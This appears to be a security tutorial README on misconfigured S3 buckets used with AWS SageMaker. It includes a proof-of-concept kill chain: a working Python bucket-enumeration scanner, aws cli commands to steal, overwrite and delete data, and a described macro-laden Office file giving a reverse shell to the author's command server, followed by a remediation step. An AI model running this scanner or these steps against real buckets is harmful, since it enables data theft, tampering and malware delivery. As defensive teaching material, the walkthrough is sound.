# AWS Sagemaker S3 Bucket Vulnerabilities

## Sagemaker Architecture

![image](https://github.com/caadams4/s3-killchain/assets/79220528/8a74b556-61e3-4c8a-acf3-2c69f4561dda)

## s3 Buckets and Sagemaker

Protecting an S3 bucket used by AWS SageMaker is crucial for several reasons:

### 1. Data Security
- **Sensitive Data**: S3 buckets often store sensitive data, including training datasets, model artifacts, and output predictions. Unauthorized access could lead to data breaches and exposure of confidential information.
- **Compliance**: Many organizations must comply with regulations (e.g., GDPR, HIPAA) that require strict data protection measures. Ensuring the security of S3 buckets helps maintain compliance with these regulations.

### 2. Integrity of Data
- **Accurate Models**: The integrity of the training data is essential for developing accurate machine learning models. Unauthorized changes to the data can lead to corrupted or biased models, affecting their performance and reliability.
- **Traceability**: Protecting the data ensures that the lineage and provenance of the data are maintained, which is important for auditing and reproducibility.

### 3. Operational Continuity
- **Service Disruption**: Unauthorized access or malicious activities (e.g., data deletion, encryption by ransomware) can disrupt services. Ensuring proper security measures are in place helps maintain the availability and reliability of AWS SageMaker services.

## s3 Buckets Overview
Amazon S3 (Simple Storage Service) is a scalable object storage service provided by AWS. While it is designed for high availability, scalability, and secure storage of data, misconfigurations and misuse can lead to serious security vulnerabilities. Understanding these vulnerabilities is crucial for securing your data effectively.

## Common Vulnerabilities

### 1. **Misconfigured Bucket Permissions**
   - **Public Access:** S3 buckets can be configured to allow public access, either intentionally or accidentally. This can lead to unauthorized data exposure and breaches.
   - **Complex Access Policies:** Errors in bucket policies or IAM (Identity and Access Management) roles can result in unintended permissions, potentially allowing unauthorized users to access or modify data.

### 2. **Unsecured Data Transfers**
   - **Data in Transit:** Data not using SSL/TLS encryption during transfer is susceptible to interception by malicious actors.
   - **Encryption at Rest:** Failure to enable encryption at rest allows physically accessed data to be readable.

### 3. **Outdated Data Management Policies**
   - **Retention Policies:** Improperly managed data lifecycle policies can lead to retaining sensitive data longer than necessary, increasing the risk if the bucket is compromised.
   - **Deletion Policies:** Accidental or malicious deletion of important data due to lack of safeguards or backup strategies.

## Best Practices for Securing S3 Buckets
1. **Enable Bucket Encryption:** Always use server-side encryption (SSE) to protect data at rest.
2. **Use Secure Transport Protocols:** Enforce the use of HTTPS to secure data in transit.
3. **Implement Strong Access Controls:** Use IAM roles and bucket policies to strictly control who can access the data.
4. **Enable Logging and Monitoring:** Utilize AWS CloudTrail and other monitoring tools to keep an eye on bucket usage and access patterns.
5. **Regularly Review Permissions:** Periodically audit S3 buckets and IAM roles to ensure only necessary permissions are granted.

# Performing a PoC Attack on a vulnerable s3 Bucket

## Reconning an organization and scanning for misconfigured s3 buckets

Given a Website for a fake company `Sage` we can generate a wordlist that we can use for fuzzing webpages, subdomains, usernames, and s3 buckets.

We will use cewl to generate the wordlist: `cewl http://34.237.3.44/ -w bucket-names.txt`

Next: we'll fast-forward to fuzzing for s3 buckets. Here I have a custom Python3 script that takes in a wordlist and fuzzes for s3 buckets that are publically accessible.

```Python3
import argparse
import requests
from colorama import Fore, Back, Style
from colorama import init
init(autoreset=True) 

def scan_4_public_access(bucket_names):
    for bucket_name in bucket_names:
        url = f'http://{bucket_name}.s3.amazonaws.com/'
        response = requests.get(url)
        if response.status_code == 200:
            print(Fore.RED + Style.BRIGHT + f"*** Bucket {bucket_name} -- HIT!!! Publicly accessible! Dumping contents!*** ")
            print(response.text)  # This will print the contents of the bucket, if listing is enabled.
        else:
            print(Fore.GREEN + f"Bucket {bucket_name} -- miss")


def parse_wordlist(filename):
    """Reads a wordlist file and returns a list of lines."""
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"Error: The file '{filename}' does not exist.")
        return []
    except IOError as e:
        print(f"Error: Could not read file '{filename}'. {e}")
        return []


def main():
    parser = argparse.ArgumentParser(description="Parse a wordlist into a list.")
    parser.add_argument('wordlist', type=str, help="Filename of the wordlist")
    
    args = parser.parse_args()
    
    # Parse the wordlist file into a list called bucket_names
    bucket_names = parse_wordlist(args.wordlist)
    
    # Optionally, print or process the bucket_names list here to demonstrate functionality
    print("Scanning buckets for public access!")

    scan_4_public_access(bucket_names)


if __name__ == "__main__":
    main()
```

## Scan, steal, manipulate, upload malware

Using our tool to scan for our target bucket - 

![image](https://github.com/caadams4/s3-killchain/assets/79220528/4eb9b3f5-b79f-4c8d-82a6-7d2979f82dd1)


We can manipulate the data with aws cli tools

* **List bucket contents** `aws s3 ls s3://securetrust/`
* **Download bucket data** `aws s3 cp s3://securetrust/ . --recursive`
* **Upload to bucket** `aws s3 cp scan.py s3://securetrust/`
* **Delete bucket data** `aws s3 rm s3://securetrust/fraudTrain.csv`

**Uploading Malware**

We can upload infected Microsoft Office documents to the bucket in hopes that an employee who manages AWS Sagemaker will open it out of curiosity.

Here is a Macro embedded into a Microsoft Office file that will connect to a command and control server that I control. 

![image](https://github.com/caadams4/s3-killchain/assets/79220528/3ec9efb7-f380-4276-b0bf-37b8a3b60b73)

**Getting a reverse shell**

Once the user opens the document a reverse shell is triggered: 

![image](https://github.com/caadams4/s3-killchain/assets/79220528/096135b4-cce4-4879-b6ac-144e021ab17f)

**Post-Exploitation**

After obtaining access to the victim machine, it will be necessary to perform privilege escalation plunder the contents of their files in search of IAM or other AWS credentials stored in environment variables or credential files. 

## A simple fix

The s3 bucket we exploited was publically accessible with read/write privileges. To fix this create another new bucket checking `ACLs disabled` and enable `Block Public Access` during creation.  

![image](https://github.com/caadams4/s3-killchain/assets/79220528/3b5e6756-355c-4b74-87c4-b0b56fc29a31)




## Conclusion
Securing an AWS S3 bucket requires careful attention to configuration settings and access controls. By understanding common vulnerabilities and adopting best practices, organizations can significantly mitigate risks associated with S3 storage.
